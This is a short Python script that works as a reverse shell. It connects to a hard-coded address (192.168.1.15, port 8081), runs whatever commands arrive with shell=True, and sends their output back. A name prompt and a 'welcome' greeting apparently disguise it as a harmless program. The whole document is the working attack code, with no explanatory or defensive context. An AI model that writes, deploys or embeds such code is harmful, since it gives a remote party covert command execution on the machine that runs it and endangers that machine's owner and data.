import socket
import subprocess
m = input("your name : ")
REMOTE_HOST = '192.168.1.15' # '192.168.43.82'
REMOTE_PORT = 8081 # 2222
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")

while True:
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("welcome" +" "+ m)
    client.send(output + output_error)
